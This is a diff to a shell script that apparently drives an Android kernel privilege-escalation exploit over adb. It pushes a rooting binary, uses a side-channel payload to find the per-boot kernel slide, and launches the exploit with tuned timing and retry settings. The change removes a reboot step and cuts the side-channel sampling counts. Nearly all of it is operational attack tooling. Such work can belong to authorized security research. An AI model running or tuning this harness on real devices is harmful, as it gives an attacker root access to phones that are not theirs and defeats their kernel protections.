@@ -26,8 +26,7 @@ fingerprint=$(adb shell getprop ro.build.fingerprint | tr -d '\r')
   exit 1
 }
 
-echo '[1/5] Rebooting to obtain a clean allocator state.'
-adb reboot
+echo '[1/5] Waiting for the authorized device.'
 adb wait-for-device
 until [[ "$(adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" == 1 ]]; do
   sleep 2
@@ -42,7 +41,7 @@ adb shell chmod 0755 "$REMOTE_DIR/sh53d-root"
 
 echo '[3/5] Resolving the per-boot kernel slide.'
 adb shell env \
-  SLIDE_ONLY=1 RMG_KSNITCH_REPEAT=32 RMG_KSNITCH_AVERAGE=4 \
+  SLIDE_ONLY=1 RMG_KSNITCH_REPEAT=8 RMG_KSNITCH_AVERAGE=1 \
   "$REMOTE_DIR/sh53d-root" --run-payload \
   "$REMOTE_DIR/sh53d-slide.so" "$REMOTE_DIR/sh53d-root" "$SLIDE_LOG"
 slide=$(adb shell cat "$SLIDE_LOG" | tr -d '\r' |
@@ -67,8 +66,9 @@ adb shell env \
   PSELECT_M53_WRITE_ONLY_CFI=0 \
   PSELECT_DELAY_USEC=5000 \
   PSELECT_SUPERVISOR_FIXED_DELAY_RUNTIME=1 \
-  RMG_KSNITCH_REPEAT=32 \
-  RMG_KSNITCH_AVERAGE=4 \
+  RMG_KSNITCH_REPEAT=8 \
+  RMG_KSNITCH_AVERAGE=1 \
+  EXPLOIT_RETRY_DELAY_SEC=0 \
   EXPLOIT_ATTEMPTS=12 \
   EXPLOIT_ATTEMPT_TIMEOUT_SEC=180 \
   "$REMOTE_DIR/sh53d-root" --run-payload \
